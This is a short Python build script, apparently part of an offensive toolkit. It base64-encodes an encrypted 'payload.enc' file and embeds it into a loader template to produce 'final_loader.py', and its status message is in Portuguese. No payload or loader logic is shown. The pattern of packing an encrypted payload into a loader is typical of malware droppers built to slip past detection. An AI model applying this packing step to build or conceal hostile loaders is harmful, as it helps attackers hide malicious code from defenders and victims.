# embedder.py
import base64

with open("payload.enc", "rb") as f:
    b64_payload = base64.b64encode(f.read()).decode()

with open("loader_embedded.py", "r") as f:
    code = f.read()

code = code.replace('b"""__REPLACE_ME__"""', f'b"""{b64_payload}"""')

with open("final_loader.py", "w") as f:
    f.write(code)

print("[+] Payload embutido com sucesso em final_loader.py")